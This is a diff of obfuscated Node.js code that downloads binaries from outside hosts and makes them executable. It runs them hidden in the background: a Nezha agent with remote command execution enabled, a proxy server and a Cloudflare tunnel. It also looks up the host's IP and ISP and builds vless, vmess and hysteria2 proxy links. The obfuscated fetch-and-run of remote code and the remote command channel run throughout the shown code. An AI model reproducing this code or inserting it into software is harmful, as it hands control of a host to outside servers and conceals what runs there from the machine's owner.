+    console['log'](_0x57e4a6(0x17a))
     return
   }
-  const _0x4b32bc = _0x11b60e['map']((_0xac46a5) => {
-    return new Promise((_0x5f143a, _0x3a8d01) => {
-      const _0x12e9e8 = (_0x25ed7a) => {
-        const _0x4b5386 = _0x60c6
-        downloadFile(_0xac46a5['fileName'], _0xac46a5[_0x4b5386(0x1ce)][_0x25ed7a], (_0x51ee05, _0x1e2e5c) => {
-          const _0x2f6c3f = _0x4b5386
-          if (!_0x51ee05) {
-            _0x5f143a(_0x1e2e5c)
+  const _0x41825e = _0x3924d1[_0x57e4a6(0x1b3)]((_0x5e9eb9) => {
+    return new Promise((_0x4604d0, _0xde7ccc) => {
+      const _0xc2e3c1 = (_0xa0f7df) => {
+        downloadFile(_0x5e9eb9['fileName'], _0x5e9eb9['fileUrls'][_0xa0f7df], (_0x4e398d, _0x19779e) => {
+          const _0x279e15 = _0x4856
+          if (!_0x4e398d) {
+            _0x4604d0(_0x19779e)
             return
           }
-          if (_0x25ed7a + 0x1 < _0xac46a5[_0x2f6c3f(0x1ce)][_0x2f6c3f(0x1c2)]) {
-            ;(console[_0x2f6c3f(0x12d)](_0x2f6c3f(0x175) + path[_0x2f6c3f(0x1b2)](_0xac46a5[_0x2f6c3f(0x16c)]) + _0x2f6c3f(0x15f)),
-              _0x12e9e8(_0x25ed7a + 0x1))
+          if (_0xa0f7df + 0x1 < _0x5e9eb9[_0x279e15(0x156)][_0x279e15(0x1e8)]) {
+            ;(console['log']('Retrying\x20' + path[_0x279e15(0x15b)](_0x5e9eb9[_0x279e15(0x158)]) + _0x279e15(0x24b)), _0xc2e3c1(_0xa0f7df + 0x1))
             return
           }
-          _0x3a8d01(_0x51ee05)
+          _0xde7ccc(_0x4e398d)
         })
       }
-      _0x12e9e8(0x0)
+      _0xc2e3c1(0x0)
     })
   })
   try {
-    await Promise[_0x3cf65e(0x17c)](_0x4b32bc)
-  } catch (_0x36eafd) {
-    console[_0x3cf65e(0xd1)](_0x3cf65e(0x13c), _0x36eafd)
+    await Promise[_0x57e4a6(0x146)](_0x41825e)
+  } catch (_0x1054d8) {
+    console[_0x57e4a6(0x1ef)](_0x57e4a6(0x186), _0x1054d8)
     return
   }
-  function _0x514cf3(_0xe8831) {
-    const _0x71c21e = _0x3cf65e,
-      _0x5d331a = 0x1fd
-    _0xe8831[_0x71c21e(0x12f)]((_0x4b1132) => {
-      const _0x2f809d = _0x71c21e
-      if (fs[_0x2f809d(0x16a)](_0x4b1132))
+  function _0x8f9db2(_0x301f53) {
+    const _0x10f210 = _0x57e4a6,
+      _0x54d9b9 = 0x1fd
+    _0x301f53[_0x10f210(0x237)]((_0x2e257c) => {
+      const _0x36a23c = _0x10f210
+      if (fs[_0x36a23c(0x201)](_0x2e257c))
         try {
-          ;(fs['chmodSync'](_0x4b1132, _0x5d331a),
-            console[_0x2f809d(0x12d)](_0x2f809d(0x1ca) + _0x4b1132 + ':\x20' + _0x5d331a[_0x2f809d(0xe4)](0x8)))
-        } catch (_0xc6f02a) {
-          console[_0x2f809d(0xd1)]('Empowerment\x20failed\x20for\x20' + _0x4b1132 + ':\x20' + _0xc6f02a)
+          ;(fs[_0x36a23c(0x1e2)](_0x2e257c, _0x54d9b9),
+            console[_0x36a23c(0x189)]('Empowerment\x20success\x20for\x20' + _0x2e257c + ':\x20' + _0x54d9b9[_0x36a23c(0x21d)](0x8)))
+        } catch (_0x510ee2) {
+          console[_0x36a23c(0x1ef)](_0x36a23c(0x16c) + _0x2e257c + ':\x20' + _0x510ee2)
         }
     })
   }
-  const _0x9d16b3 = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
-  _0x514cf3(_0x9d16b3)
+  const _0x4b3d91 = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
+  _0x8f9db2(_0x4b3d91)
   if (NEZHA_SERVER && NEZHA_KEY) {
     if (!NEZHA_PORT) {
-      const _0x112662 = NEZHA_SERVER[_0x3cf65e(0x100)](':') ? NEZHA_SERVER[_0x3cf65e(0x1e9)](':')['pop']() : '',
-        _0x2ed09f = new Set(['443', '8443', '2096', _0x3cf65e(0xed), '2083', _0x3cf65e(0xf7)]),
-        _0x3e0bc7 = _0x2ed09f[_0x3cf65e(0x10f)](_0x112662) ? _0x3cf65e(0x1ea) : _0x3cf65e(0x1c5),
-        _0x5ee899 =
-          '\x0aclient_secret:\x20' +
-          NEZHA_KEY +
-          '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20' +
-          NEZHA_SERVER +
-          _0x3cf65e(0xd7) +
-          _0x3e0bc7 +
-          _0x3cf65e(0xf5) +
-          UUID
-      fs['writeFileSync'](path[_0x3cf65e(0x1b9)](FILE_PATH, _0x3cf65e(0x164)), _0x5ee899)
-      const _0x168c82 = _0x3cf65e(0xe5) + phpPath + '\x20-c\x20\x22' + FILE_PATH + _0x3cf65e(0x1ef)
+      const _0x4b506a = NEZHA_SERVER[_0x57e4a6(0x18c)](':') ? NEZHA_SERVER[_0x57e4a6(0x183)](':')[_0x57e4a6(0x169)]() : '',
+        _0x4c20b9 = new Set([_0x57e4a6(0x14c), _0x57e4a6(0x155), _0x57e4a6(0x1fd), '2087', '2083', '2053']),
+        _0x2315ca = _0x4c20b9['has'](_0x4b506a) ? _0x57e4a6(0x17b) : _0x57e4a6(0x24d),
+        _0x305700 = _0x57e4a6(0x17f) + NEZHA_KEY + _0x57e4a6(0x251) + NEZHA_SERVER + _0x57e4a6(0x207) + _0x2315ca + _0x57e4a6(0x154) + UUID
+      fs[_0x57e4a6(0x16a)](path[_0x57e4a6(0x157)](FILE_PATH, _0x57e4a6(0x220)), _0x305700)
+      const _0x3deafa = 'nohup\x20' + phpPath + _0x57e4a6(0x181) + FILE_PATH + _0x57e4a6(0x232)
       try {
-        ;(await exec(_0x168c82),
-          console[_0x3cf65e(0x12d)](phpName + _0x3cf65e(0x1c1)),
-          await new Promise((_0x386098) => setTimeout(_0x386098, 0x3e8)))
-      } catch (_0x5ef31) {
-        console[_0x3cf65e(0xd1)](_0x3cf65e(0x17f) + _0x5ef31)
+        ;(await exec(_0x3deafa),
+          console[_0x57e4a6(0x189)](phpName + _0x57e4a6(0x21b)),
+          await new Promise((_0x1b1992) => setTimeout(_0x1b1992, 0x3e8)))
+      } catch (_0x3aa402) {
+        console['error'](_0x57e4a6(0x213) + _0x3aa402)
       }
     } else {
-      let _0x42afb3 = ''
-      const _0x113074 = ['443', _0x3cf65e(0x10e), _0x3cf65e(0x18e), _0x3cf65e(0xed), _0x3cf65e(0xd6), _0x3cf65e(0xf7)]
-      _0x113074[_0x3cf65e(0x100)](NEZHA_PORT) && (_0x42afb3 = _0x3cf65e(0x160))
-      const _0x3b4595 =
-        _0x3cf65e(0xe5) +
-        npmPath +
-        _0x3cf65e(0x11a) +
-        NEZHA_SERVER +
-        ':' +
-        NEZHA_PORT +
-        _0x3cf65e(0x1a7) +
-        NEZHA_KEY +
-        '\x20' +
-        _0x42afb3 +
-        _0x3cf65e(0x151)
+      let _0x4ee02a = ''
+      const _0x2914f1 = [_0x57e4a6(0x14c), _0x57e4a6(0x155), '2096', _0x57e4a6(0x165), '2083', _0x57e4a6(0x1aa)]
+      _0x2914f1[_0x57e4a6(0x18c)](NEZHA_PORT) && (_0x4ee02a = _0x57e4a6(0x23b))
+      const _0x1f564f =
+        'nohup\x20' + npmPath + _0x57e4a6(0x1d9) + NEZHA_SERVER + ':' + NEZHA_PORT + '\x20-p\x20' + NEZHA_KEY + '\x20' + _0x4ee02a + _0x57e4a6(0x1cc)
       try {
-        ;(await exec(_0x3b4595),
-          console[_0x3cf65e(0x12d)](npmName + _0x3cf65e(0x1c1)),
-          await new Promise((_0x1d34b7) => setTimeout(_0x1d34b7, 0x3e8)))
-      } catch (_0xe33ee5) {
-        console['error'](_0x3cf65e(0x11f) + _0xe33ee5)
+        ;(await exec(_0x1f564f), console['log'](npmName + _0x57e4a6(0x21b)), await new Promise((_0x49065a) => setTimeout(_0x49065a, 0x3e8)))
+      } catch (_0x3abf06) {
+        console['error'](_0x57e4a6(0x1ab) + _0x3abf06)
       }
     }
-  } else console[_0x3cf65e(0x12d)]('NEZHA\x20variable\x20is\x20empty,skip\x20running')
-  const _0x4fb381 = 'nohup\x20' + webPath + '\x20-c\x20' + FILE_PATH + _0x3cf65e(0x1cb)
+  } else console[_0x57e4a6(0x189)](_0x57e4a6(0x1cf))
+  const _0x15e4fb = 'nohup\x20' + webPath + _0x57e4a6(0x24c) + FILE_PATH + _0x57e4a6(0x1d5)
   try {
-    ;(await exec(_0x4fb381), console[_0x3cf65e(0x12d)](webName + _0x3cf65e(0x1c1)), await new Promise((_0x1d56f0) => setTimeout(_0x1d56f0, 0x3e8)))
-  } catch (_0x3a9351) {
-    console[_0x3cf65e(0xd1)](_0x3cf65e(0x162) + _0x3a9351)
+    ;(await exec(_0x15e4fb), console['log'](webName + _0x57e4a6(0x21b)), await new Promise((_0x492f37) => setTimeout(_0x492f37, 0x3e8)))
+  } catch (_0x15a0e5) {
+    console['error'](_0x57e4a6(0x23a) + _0x15a0e5)
   }
-  if (fs[_0x3cf65e(0x16a)](botPath)) {
-    let _0x369816
-    if (ARGO_AUTH[_0x3cf65e(0x153)](/^[A-Z0-9a-z=]{120,250}$/))
-      _0x369816 = 'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20' + ARGO_AUTH
+  if (fs[_0x57e4a6(0x201)](botPath)) {
+    let _0x591630
+    if (ARGO_AUTH[_0x57e4a6(0x22c)](/^[A-Z0-9a-z=]{120,250}$/))
+      _0x591630 = 'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20' + ARGO_AUTH
     else
       ARGO_AUTH['match'](/TunnelSecret/)
-        ? (_0x369816 = _0x3cf65e(0xe7) + path['resolve'](FILE_PATH, _0x3cf65e(0x14a)) + _0x3cf65e(0x1db))
-        : (_0x369816 = _0x3cf65e(0x17b) + path[_0x3cf65e(0x14c)](bootLogPath) + _0x3cf65e(0x10b) + ARGO_PORT)
+        ? (_0x591630 = _0x57e4a6(0x1d7) + path[_0x57e4a6(0x20c)](FILE_PATH, _0x57e4a6(0x1a9)) + _0x57e4a6(0x1dc))
+        : (_0x591630 = _0x57e4a6(0x25a) + path['resolve'](bootLogPath) + _0x57e4a6(0x162) + ARGO_PORT)
     try {
-      ;(await exec(_0x3cf65e(0x1e8) + path[_0x3cf65e(0x14c)](botPath) + '\x22\x20' + _0x369816 + '\x20>/dev/null\x202>&1\x20&'),
-        console[_0x3cf65e(0x12d)](botName + _0x3cf65e(0x1c1)),
-        await new Promise((_0x398dc5) => setTimeout(_0x398dc5, 0x7d0)))
-    } catch (_0x366a54) {
-      console[_0x3cf65e(0xd1)](_0x3cf65e(0x196) + _0x366a54)
+      ;(await exec(_0x57e4a6(0x145) + path['resolve'](botPath) + '\x22\x20' + _0x591630 + _0x57e4a6(0x175)),
+        console[_0x57e4a6(0x189)](botName + _0x57e4a6(0x21b)),
+        await new Promise((_0x3f112b) => setTimeout(_0x3f112b, 0x7d0)))
+    } catch (_0x5ba3c4) {
+      console['error']('Error\x20executing\x20command:\x20' + _0x5ba3c4)
     }
   }
-  await new Promise((_0x149201) => setTimeout(_0x149201, 0x1388))
+  await new Promise((_0x408093) => setTimeout(_0x408093, 0x1388))
 }
-function getFilesForArchitecture(_0x5271bc) {
-  const _0x5725be = _0x3e3e40,
-    _0x559760 = _0x5271bc === _0x5725be(0x1a5) ? _0x5725be(0x1ad) : 'https://amd64.oooen.com',
-    _0x75d9b7 = _0x5271bc === _0x5725be(0x1a5) ? 'https://arm64.ssss.nyc.mn' : _0x5725be(0x15d),
-    _0x2c2ece = [
-      { fileName: webPath, fileUrls: [_0x559760 + _0x5725be(0x12c), _0x75d9b7 + _0x5725be(0x12c)] },
-      { fileName: botPath, fileUrls: [_0x559760 + _0x5725be(0x16f), _0x75d9b7 + _0x5725be(0x16f)] }
+function getFilesForArchitecture(_0x524c55) {
+  const _0xcc7f3a = _0x2a1a64,
+    _0x52067e = _0x524c55 === _0xcc7f3a(0x1a3) ? _0xcc7f3a(0x205) : 'https://amd64.oooen.com',
+    _0x1b557c = _0x524c55 === _0xcc7f3a(0x1a3) ? 'https://arm64.ssss.nyc.mn' : _0xcc7f3a(0x212),
+    _0xc9aaac = [
+      { fileName: webPath, fileUrls: [_0x52067e + _0xcc7f3a(0x1a4), _0x1b557c + _0xcc7f3a(0x1a4)] },
+      { fileName: botPath, fileUrls: [_0x52067e + _0xcc7f3a(0x215), _0x1b557c + '/bot'] }
     ]
   return (
     NEZHA_SERVER &&
       NEZHA_KEY &&
       (NEZHA_PORT
-        ? _0x2c2ece[_0x5725be(0x120)]({ fileName: npmPath, fileUrls: [_0x559760 + '/agent', _0x75d9b7 + _0x5725be(0x1f0)] })
-        : _0x2c2ece[_0x5725be(0x120)]({ fileName: phpPath, fileUrls: [_0x559760 + '/v1', _0x75d9b7 + _0x5725be(0x136)] })),
-    _0x2c2ece
+        ? _0xc9aaac[_0xcc7f3a(0x190)]({ fileName: npmPath, fileUrls: [_0x52067e + '/agent', _0x1b557c + _0xcc7f3a(0x260)] })
+        : _0xc9aaac[_0xcc7f3a(0x190)]({ fileName: phpPath, fileUrls: [_0x52067e + _0xcc7f3a(0x211), _0x1b557c + '/v1'] })),
+    _0xc9aaac
   )
 }
 function argoType() {
-  const _0x122ae5 = _0x3e3e40
+  const _0x1a54ad = _0x2a1a64
   if (!ARGO_AUTH || !ARGO_DOMAIN) {
-    console['log'](_0x122ae5(0x1b5))
+    console[_0x1a54ad(0x189)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20is\x20empty,\x20use\x20quick\x20tunnels')
     return
   }
-  if (ARGO_AUTH[_0x122ae5(0x100)](_0x122ae5(0x1c0))) {
-    fs['writeFileSync'](path[_0x122ae5(0x1b9)](FILE_PATH, _0x122ae5(0x130)), ARGO_AUTH)
-    const _0x3ea11a =
+  if (ARGO_AUTH[_0x1a54ad(0x18c)](_0x1a54ad(0x244))) {
+    fs['writeFileSync'](path[_0x1a54ad(0x157)](FILE_PATH, _0x1a54ad(0x1bc)), ARGO_AUTH)
+    const _0xe36253 =
       '\x0a\x20\x20tunnel:\x20' +
-      ARGO_AUTH[_0x122ae5(0x1e9)]('\x22')[0xb] +
-      _0x122ae5(0xe8) +
-      path[_0x122ae5(0x1b9)](FILE_PATH, 'tunnel.json') +
+      ARGO_AUTH['split']('\x22')[0xb] +
+      '\x0a\x20\x20credentials-file:\x20' +
+      path[_0x1a54ad(0x157)](FILE_PATH, _0x1a54ad(0x1bc)) +
       '\x0a\x20\x20protocol:\x20http2\x0a\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20' +
       ARGO_DOMAIN +
-      _0x122ae5(0x1bb) +
+      '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:' +
       ARGO_PORT +
-      _0x122ae5(0x1d4)
-    fs[_0x122ae5(0x19c)](path[_0x122ae5(0x1b9)](FILE_PATH, _0x122ae5(0x14a)), _0x3ea11a)
-  } else console[_0x122ae5(0x12d)](_0x122ae5(0xd8) + ARGO_PORT + '\x20in\x20clouudflare')
+      _0x1a54ad(0x170)
+    fs[_0x1a54ad(0x16a)](path['join'](FILE_PATH, _0x1a54ad(0x1a9)), _0xe36253)
+  } else console[_0x1a54ad(0x189)]('Using\x20token\x20connect\x20to\x20tunnel,\x20please\x20set\x20' + ARGO_PORT + _0x1a54ad(0x1ff))
 }
-async function waitForQuickTunnelLog(_0x36661d = 0x7530) {
-  const _0x4350ad = _0x3e3e40,
-    _0x2e891f = Date[_0x4350ad(0x159)]() + _0x36661d
-  while (Date[_0x4350ad(0x159)]() < _0x2e891f) {
+async function waitForQuickTunnelLog(_0x39e889 = 0x7530) {
+  const _0x1b34ee = _0x2a1a64,
+    _0x384886 = Date[_0x1b34ee(0x191)]() + _0x39e889
+  while (Date[_0x1b34ee(0x191)]() < _0x384886) {
     try {
-      if (fs[_0x4350ad(0x16a)](bootLogPath)) {
-        const _0x1c1eaa = fs[_0x4350ad(0x186)](bootLogPath, _0x4350ad(0x142))
-        if (/trycloudflare\.com/[_0x4350ad(0xfc)](_0x1c1eaa)) return _0x1c1eaa
+      if (fs[_0x1b34ee(0x201)](bootLogPath)) {
+        const _0x556e15 = fs[_0x1b34ee(0x21e)](bootLogPath, _0x1b34ee(0x14d))
+        if (/trycloudflare\.com/['test'](_0x556e15)) return _0x556e15
       }
-    } catch (_0x2747e4) {}
-    await new Promise((_0x312d78) => setTimeout(_0x312d78, 0x3e8))
+    } catch (_0x1466e3) {}
+    await new Promise((_0x3dc3f6) => setTimeout(_0x3dc3f6, 0x3e8))
   }
   return ''
 }
 async function extractDomains() {
-  const _0x342f63 = _0x3e3e40
-  let _0x2ee203
-  if (ARGO_AUTH && ARGO_DOMAIN) ((_0x2ee203 = ARGO_DOMAIN), console[_0x342f63(0x12d)](_0x342f63(0x1c8), _0x2ee203), await generateLinks(_0x2ee203))
+  const _0x1eaa29 = _0x2a1a64
+  let _0x1f388c
+  if (ARGO_AUTH && ARGO_DOMAIN) ((_0x1f388c = ARGO_DOMAIN), console[_0x1eaa29(0x189)]('ARGO_DOMAIN:', _0x1f388c), await generateLinks(_0x1f388c))
   else
     try {
-      const _0x584caf = await waitForQuickTunnelLog(),
-        _0x27bbb6 = _0x584caf[_0x342f63(0x1e9)]('\x0a'),
-        _0x38e1bf = []
-      _0x27bbb6[_0x342f63(0x12f)]((_0x48d37f) => {
-        const _0x32f724 = _0x342f63,
-          _0x26f093 = _0x48d37f[_0x32f724(0x153)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
-        if (_0x26f093) {
-          const _0x162e82 = _0x26f093[0x1]
-          _0x38e1bf[_0x32f724(0x141)](_0x162e82)
+      const _0x36bde1 = await waitForQuickTunnelLog(),
+        _0x5dbbf4 = _0x36bde1['split']('\x0a'),
+        _0x4a4ff5 = []
+      _0x5dbbf4[_0x1eaa29(0x237)]((_0x31e59c) => {
+        const _0x9f0568 = _0x31e59c['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
+        if (_0x9f0568) {
+          const _0x39577b = _0x9f0568[0x1]
+          _0x4a4ff5['push'](_0x39577b)
         }
       })
-      if (_0x38e1bf[_0x342f63(0x1c2)] > 0x0) ((_0x2ee203 = _0x38e1bf[0x0]), console['log']('ArgoDomain:', _0x2ee203), await generateLinks(_0x2ee203))
+      if (_0x4a4ff5[_0x1eaa29(0x1e8)] > 0x0)
+        ((_0x1f388c = _0x4a4ff5[0x0]), console[_0x1eaa29(0x189)]('ArgoDomain:', _0x1f388c), await generateLinks(_0x1f388c))
       else {
-        ;(console[_0x342f63(0x12d)](_0x342f63(0x1c9)), fs[_0x342f63(0x1bf)](path[_0x342f63(0x1b9)](FILE_PATH, _0x342f63(0x1b6))))
-        async function _0x2bb677() {
-          const _0x9872bc = _0x342f63
+        ;(console[_0x1eaa29(0x189)](_0x1eaa29(0x1c9)), fs[_0x1eaa29(0x226)](path[_0x1eaa29(0x157)](FILE_PATH, _0x1eaa29(0x1c5))))
+        async function _0x59daa8() {
+          const _0x3d542a = _0x1eaa29
           try {
-            process['platform'] === _0x9872bc(0x150)
-              ? await exec(_0x9872bc(0xe9) + botName + _0x9872bc(0x143))
-              : await exec(_0x9872bc(0x137) + botName[_0x9872bc(0x1ec)](0x0) + ']' + botName['substring'](0x1) + _0x9872bc(0x1b4))
-          } catch (_0x458cd5) {}
+            process['platform'] === _0x3d542a(0x22e)
+              ? await exec(_0x3d542a(0x1b7) + botName + _0x3d542a(0x150))
+              : await exec(_0x3d542a(0x21f) + botName['charAt'](0x0) + ']' + botName[_0x3d542a(0x24f)](0x1) + _0x3d542a(0x194))
+          } catch (_0x501cce) {}
         }
-        ;(_0x2bb677(), await new Promise((_0x16c31d) => setTimeout(_0x16c31d, 0xbb8)))
-        const _0x163114 = _0x342f63(0x17b) + path[_0x342f63(0x14c)](bootLogPath) + _0x342f63(0x10b) + ARGO_PORT
+        ;(_0x59daa8(), await new Promise((_0x5e5a63) => setTimeout(_0x5e5a63, 0xbb8)))
+        const _0x527e13 = _0x1eaa29(0x25a) + path[_0x1eaa29(0x20c)](bootLogPath) + _0x1eaa29(0x162) + ARGO_PORT
         try {
-          ;(await exec(_0x342f63(0x1e8) + path[_0x342f63(0x14c)](botPath) + '\x22\x20' + _0x163114 + _0x342f63(0x149)),
-            console[_0x342f63(0x12d)](botName + _0x342f63(0x1c1)),
-            await new Promise((_0x117924) => setTimeout(_0x117924, 0x1770)),
+          ;(await exec(_0x1eaa29(0x145) + path[_0x1eaa29(0x20c)](botPath) + '\x22\x20' + _0x527e13 + _0x1eaa29(0x175)),
+            console[_0x1eaa29(0x189)](botName + _0x1eaa29(0x21b)),
+            await new Promise((_0x4e1119) => setTimeout(_0x4e1119, 0x1770)),
             await extractDomains())
-        } catch (_0x263b2e) {
-          console[_0x342f63(0xd1)](_0x342f63(0x196) + _0x263b2e)
+        } catch (_0x3f5550) {
+          console['error'](_0x1eaa29(0x234) + _0x3f5550)
         }
       }
-    } catch (_0x5360c3) {
-      console[_0x342f63(0xd1)]('Error\x20reading\x20boot.log:', _0x5360c3)
+    } catch (_0x4bc6ad) {
+      console['error'](_0x1eaa29(0x1f1), _0x4bc6ad)
     }
 }
 async function getMetaInfo() {
-  const _0x3ff54b = _0x3e3e40
+  const _0x132a6a = _0x2a1a64
   try {
-    const _0x1935ab = await axios[_0x3ff54b(0x11d)](_0x3ff54b(0x191), { headers: { 'User-Agent': _0x3ff54b(0x165), timeout: 0xbb8 } })
-    if (_0x1935ab[_0x3ff54b(0x1a2)] && _0x1935ab[_0x3ff54b(0x1a2)][_0x3ff54b(0x1a6)] && _0x1935ab[_0x3ff54b(0x1a2)]['isp'])
-      return (_0x1935ab[_0x3ff54b(0x1a2)][_0x3ff54b(0x1a6)] + '-' + _0x1935ab['data']['isp'])[_0x3ff54b(0x155)](/\s+/g, '_')
-  } catch (_0x408915) {
+    const _0x93e2af = await axios['get'](_0x132a6a(0x20e), { headers: { 'User-Agent': _0x132a6a(0x250), timeout: 0xbb8 } })
+    if (_0x93e2af['data'] && _0x93e2af[_0x132a6a(0x1ca)][_0x132a6a(0x1c1)] && _0x93e2af[_0x132a6a(0x1ca)][_0x132a6a(0x1dd)])
+      return (_0x93e2af[_0x132a6a(0x1ca)][_0x132a6a(0x1c1)] + '-' + _0x93e2af[_0x132a6a(0x1ca)][_0x132a6a(0x1dd)])[_0x132a6a(0x173)](/\s+/g, '_')
+  } catch (_0x1c2dff) {
     try {
-      const _0x37bd48 = await axios[_0x3ff54b(0x11d)](_0x3ff54b(0x1d2), { headers: { 'User-Agent': _0x3ff54b(0x165), timeout: 0xbb8 } })
+      const _0x6f8709 = await axios[_0x132a6a(0x209)](_0x132a6a(0x159), { headers: { 'User-Agent': _0x132a6a(0x250), timeout: 0xbb8 } })
       if (
-        _0x37bd48[_0x3ff54b(0x1a2)] &&
-        _0x37bd48[_0x3ff54b(0x1a2)][_0x3ff54b(0x1ac)] === _0x3ff54b(0x1a1) &&
-        _0x37bd48[_0x3ff54b(0x1a2)]['countryCode'] &&
-        _0x37bd48[_0x3ff54b(0x1a2)][_0x3ff54b(0x15c)]
+        _0x6f8709[_0x132a6a(0x1ca)] &&
+        _0x6f8709[_0x132a6a(0x1ca)][_0x132a6a(0x262)] === _0x132a6a(0x221) &&
+        _0x6f8709[_0x132a6a(0x1ca)]['countryCode'] &&
+        _0x6f8709[_0x132a6a(0x1ca)]['org']
       )
-        return (_0x37bd48['data']['countryCode'] + '-' + _0x37bd48[_0x3ff54b(0x1a2)][_0x3ff54b(0x15c)])[_0x3ff54b(0x155)](/\s+/g, '_')
-    } catch (_0x40aa04) {}
+        return (_0x6f8709[_0x132a6a(0x1ca)][_0x132a6a(0x18e)] + '-' + _0x6f8709[_0x132a6a(0x1ca)][_0x132a6a(0x16b)])[_0x132a6a(0x173)](/\s+/g, '_')
+    } catch (_0x54b3a5) {}
   }
-  return _0x3ff54b(0x17e)
+  return _0x132a6a(0x23d)
 }
 async function getServerIP() {
-  const _0x495a19 = _0x3e3e40
-  let _0x1d317 = ''
+  const _0x8834c8 = _0x2a1a64
+  let _0x457882 = ''
   try {
-    const _0x40e041 = await axios['get'](_0x495a19(0x146), { timeout: 0xbb8 })
-    _0x1d317 = _0x40e041[_0x495a19(0x1a2)][_0x495a19(0x115)]()
-  } catch (_0x1cb216) {
+    const _0x39cb15 = await axios[_0x8834c8(0x209)](_0x8834c8(0x1b4), { timeout: 0xbb8 })
+    _0x457882 = _0x39cb15[_0x8834c8(0x1ca)]['trim']()
+  } catch (_0xf435a3) {
     try {
-      _0x1d317 = execSync(_0x495a19(0x19f))[_0x495a19(0xe4)]()[_0x495a19(0x115)]()
-    } catch (_0x5f0138) {
+      _0x457882 = execSync(_0x8834c8(0x253))[_0x8834c8(0x21d)]()['trim']()
+    } catch (_0x5d9da5) {
       try {
-        const _0x28b6cc = await axios['get'](_0x495a19(0x18d), { timeout: 0xbb8 })
-        _0x1d317 = '[' + _0x28b6cc[_0x495a19(0x1a2)][_0x495a19(0x115)]() + ']'
-      } catch (_0x564ec1) {
+        const _0x2a5c62 = await axios['get'](_0x8834c8(0x1e1), { timeout: 0xbb8 })
+        _0x457882 = '[' + _0x2a5c62[_0x8834c8(0x1ca)]['trim']() + ']'
+      } catch (_0x34f96c) {
         try {
-          _0x1d317 = '[' + execSync('curl\x20-sm\x203\x20ipv6.ip.sb')[_0x495a19(0xe4)]()[_0x495a19(0x115)]() + ']'
-        } catch (_0x44ae38) {
-          console[_0x495a19(0xd1)](_0x495a19(0x14e), _0x44ae38[_0x495a19(0x14b)])
+          _0x457882 = '[' + execSync('curl\x20-sm\x203\x20ipv6.ip.sb')[_0x8834c8(0x21d)]()[_0x8834c8(0x240)]() + ']'
+        } catch (_0x4f55b3) {
+          console['error'](_0x8834c8(0x184), _0x4f55b3[_0x8834c8(0x222)])
         }
       }
     }
   }
-  return _0x1d317
+  return _0x457882
 }
-async function generateLinks(_0x34b01f) {
-  const _0x435b93 = await getMetaInfo(),
-    _0x58b121 = NAME ? NAME + '-' + _0x435b93 : _0x435b93,
-    _0x14c8a0 = await getServerIP()
-  return new Promise((_0x35b103) => {
+async function generateLinks(_0x4e4a53) {
+  const _0x100275 = await getMetaInfo(),
+    _0x491774 = NAME ? NAME + '-' + _0x100275 : _0x100275,
+    _0x5073a2 = await getServerIP()
+  return new Promise((_0x3f1e38) => {
     setTimeout(() => {
-      const _0x34b469 = _0x60c6,
-        _0x55329a = {
+      const _0x7a612 = _0x4856,
+        _0x39de67 = {
           v: '2',
-          ps: '' + _0x58b121,
+          ps: '' + _0x491774,
           add: CFIP,
           port: CFPORT,
           id: UUID,
           aid: '0',
-          scy: _0x34b469(0xd4),
+          scy: _0x7a612(0x15c),
           net: 'ws',
-          type: _0x34b469(0xdc),
-          host: _0x34b01f,
-          path: _0x34b469(0x1ee),
-          tls: _0x34b469(0x1e4),
-          sni: _0x34b01f,
+          type: _0x7a612(0x21c),
+          host: _0x4e4a53,
+          path: _0x7a612(0x1c6),
+          tls: _0x7a612(0x179),
+          sni: _0x4e4a53,
           alpn: '',
-          fp: _0x34b469(0xef)
+          fp: 'firefox'
         }
-      let _0x691f38 =
-        _0x34b469(0x1dd) +
+      let _0x43ace5 =
+        _0x7a612(0x25e) +
         UUID +
         '@' +
         CFIP +
         ':' +
         CFPORT +
-        _0x34b469(0x118) +
-        _0x34b01f +
-        _0x34b469(0x111) +
-        _0x34b01f +
-        _0x34b469(0x193) +
-        _0x58b121 +
+        '?encryption=none&security=tls&sni=' +
+        _0x4e4a53 +
+        '&fp=firefox&type=ws&host=' +
+        _0x4e4a53 +
+        '&path=%2Fvless-argo%3Fed%3D2560#' +
+        _0x491774 +
         '\x0a\x0avmess://' +
-        Buffer[_0x34b469(0xdf)](JSON['stringify'](_0x55329a))[_0x34b469(0xe4)]('base64') +
-        _0x34b469(0x1af) +
+        Buffer['from'](JSON[_0x7a612(0x217)](_0x39de67))[_0x7a612(0x21d)](_0x7a612(0x23e)) +
+        _0x7a612(0x22b) +
         UUID +
         '@' +
         CFIP +
         ':' +
         CFPORT +
-        _0x34b469(0xe6) +
-        _0x34b01f +
-        _0x34b469(0x111) +
-        _0x34b01f +
-        _0x34b469(0x1b0) +
-        _0x58b121 +
-        _0x34b469(0x107)
+        _0x7a612(0x1e6) +
+        _0x4e4a53 +
+        '&fp=firefox&type=ws&host=' +
+        _0x4e4a53 +
+        _0x7a612(0x19e) +
+        _0x491774 +
+        _0x7a612(0x167)
       if (isValidPort(HY2_PORT)) {
-        const _0x72bfff = getCertificateFingerprint(certPath),
-          _0x107f7c = _0x72bfff ? _0x34b469(0x148) + encodeURIComponent(_0x72bfff) : '',
-          _0x1c7df1 = '\x0ahysteria2://' + UUID + '@' + _0x14c8a0 + ':' + HY2_PORT + _0x34b469(0x11c) + _0x107f7c + '#' + _0x58b121
-        _0x691f38 += _0x1c7df1
+        const _0x485e06 = getCertificateFingerprint(certPath),
+          _0x200559 = _0x485e06 ? _0x7a612(0x1f0) + encodeURIComponent(_0x485e06) : '',
